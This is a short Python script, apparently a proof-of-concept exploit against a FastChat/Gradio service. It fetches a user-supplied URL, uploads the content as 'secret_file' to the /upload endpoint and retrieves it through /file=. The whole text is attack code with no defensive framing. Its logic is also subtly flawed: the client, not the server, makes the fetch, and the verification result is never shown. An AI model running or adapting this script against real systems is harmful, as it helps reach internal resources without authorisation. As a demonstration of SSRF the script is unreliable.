import requests
import sys
import os

if len(sys.argv) != 2:
    print("Usage: python poc.py <URL>")
    sys.exit(1)

ssrf_dst = sys.argv[1]
print(f"Targeting URL: {ssrf_dst}")

host = os.getenv('FASTCHAT_HOST', 'localhost')
base_url = f"http://{host}:7860"
print(f"Using base URL: {base_url}")

# Try to access source file
try:
    response = requests.get(ssrf_dst)
    file_content = response.content
except Exception as e:
    print(f"Error accessing source: {e}")
    sys.exit(1)

# Upload file
url = f"{base_url}/upload"
files = {
    'files': ('secret_file', file_content, 'application/octet-stream')
}

try:
    response = requests.post(url, files=files)
    if response.ok:
        # Verify file access
        uploaded_path = response.json()[0]
        verify_url = f"{base_url}/file={uploaded_path}"
        verify_response = requests.get(verify_url)
               
except Exception as e:
    print(f"Error: {e}")
    sys.exit(1)